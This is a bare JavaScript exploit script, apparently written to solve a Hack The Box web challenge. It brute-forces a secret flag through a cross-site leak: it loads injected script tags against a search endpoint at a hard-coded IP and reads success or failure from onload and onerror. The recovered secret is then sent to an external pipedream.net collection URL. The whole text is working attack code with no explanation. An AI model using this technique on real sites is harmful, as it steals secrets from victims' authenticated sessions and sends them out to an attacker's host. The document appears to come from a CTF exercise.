var chars =
	"-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";

var special = "_";
var charLen = chars.length;
var ENDPOINT =
	"http://161.35.173.232:30753/api/entries/search?q=";

var flag = "HTB{";

const getPartial = (char) => {
	return new Promise((resolve, reject) => {
		const script = document.createElement("script");
		script.src = ENDPOINT + flag + char;
		document.head.appendChild(script);

		script.onload = () => {
			resolve(char);
		};
		script.onerror = () => {
			reject(char);
		};
	});
};

const exploit = async () => {
	let b = false;

	for (let i = 0; i < chars.length; i++) {
		let curChar = special.includes(chars[i])
			? "" + chars[i]
			: chars[i];
		await getPartial(curChar)
			.then((res) => {
				if (res === "}") {
					flag += res;
					b = true;
				} else {
					flag += res;
					i = 0;
				}
			})
			.catch((e) => null);

		if (b) {
			// console.log(flag);
			fetch(
				"https://enancxlxuxj2.x.pipedream.net/flag=" + flag,
				{
					method: "GET",
					mode: "no-cors",
				}
			);
			break;
		}
	}
};

exploit();
